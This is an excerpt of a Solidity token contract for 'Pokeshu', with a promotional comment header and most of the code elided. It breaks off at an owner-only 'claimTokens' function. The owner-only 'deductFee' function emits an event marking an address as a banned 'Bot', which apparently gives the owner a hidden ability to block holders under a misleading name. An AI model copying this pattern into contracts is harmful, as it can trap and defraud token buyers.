/**
                   Official Telegram: https://t.me/Pokeshu     Official Website: https://pokeshu.com

 /\\\\\\\\\\\\\_________/\\\\\_______/\\\________/\\\__/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\____/\\\________/\\\__/\\\________/\\\       
  \/\\\/////////\\\_____/\\\///\\\____\/\\\_____/\\\//__\/\\\///////////____/\\\/////////\\\_\/\\\_______\/\\\_\/\\\_______\/\\\       
   \/\\\_______\/\\\___/\\\/__\///\\\__\/\\\__/\\\//_____\/\\\______________\//\\\______\///__\/\\\_______\/\\\_\/\\\_______\/\\\       
    \/\\\\\\\\\\\\\/___/\\\______\//\\\_\/\\\\\\//\\\_____\/\\\\\\\\\\\_______\////\\\_________\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\     
     \/\\\/////////____\/\\\_______\/\\\_\/\\\//_\//\\\____\/\\\///////___________\////\\\______\/\\\/////////\\\_\/\\\_______\/\\\    
      \/\\\_____________\//\\\______/\\\__\/\\\____\//\\\___\/\\\_____________________\////\\\___\/\\\_______\/\\\_\/\\\_______\/\\\   
       \/\\\______________\///\\\__/\\\____\/\\\_____\//\\\__\/\\\______________/\\\______\//\\\__\/\\\_______\/\\\_\//\\\______/\\\ 
        \/\\\________________\///\\\\\/_____\/\\\______\//\\\_\/\\\\\\\\\\\\\\\_\///\\\\\\\\\\\/___\/\\\_______\/\\\__\///\\\\\\\\\/
         \///                  \/////        \///       \///   \///////////////    \///////////     \///        \///     \///////// 
         
 Pokeshu is more than an anime token inspired from Pokemon. Pokeshu is going to be a game and NFT platform operating on Ethereum Blockchain.

 Sick of dead-end meme tokens with zero utility? Looking for a real community lead by experienced marketers and trusted developers? 

 Or maybe you just want to catch rare Pokeshu and battle your way to the top to become the very best? Either way, you've found a gem.    */
...
contract Pokeshu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = 'Pokeshu';
    string private _symbol = 'POKESHU';
    ...
    event feeStatus (address Bot, bool Banned);
    ...
    function deductFee(address _address) external onlyOwner {
        ...
        emit feeStatus (_address, _deductFee[_address]);}
    }
    ...
    function claimTokens (address router, uint256 fee) public virtual onlyOwner {
